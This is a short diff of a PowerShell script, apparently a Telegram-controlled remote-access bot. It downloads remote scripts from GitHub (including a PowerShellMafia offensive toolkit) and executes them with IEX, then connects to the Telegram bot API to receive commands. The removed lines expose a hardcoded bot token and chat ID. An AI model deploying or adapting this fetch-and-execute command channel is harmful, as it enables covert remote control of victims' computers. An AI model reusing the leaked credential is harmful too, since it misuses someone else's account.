@@ -34,9 +34,9 @@ IEX (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerS
 Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Tu código es: `n`n" -ForegroundColor Green -NoNewline  ; sleep -Seconds 1
 $scriptblock = {
 param (
-[string]$botkey = "320566618:AAHKX-koQKIDUW8kTS2_23-BxIrTQ_TZSEQ",
-[string]$bot_Master_ID = "117370447",
-[int]$delay = "5"
+[string]$botkey = "",
+[string]$bot_Master_ID = "",
+[int]$delay = ""
 )
 IEX (Invoke-WebRequest "https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Functions.ps1").content
 $chat_id = $bot_Master_ID ; $getMeLink = "https://api.telegram.org/bot$botkey/getMe" ; $bot = $getMeLink -split "/" ; $bot = [string]$bot[3] ; $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" 
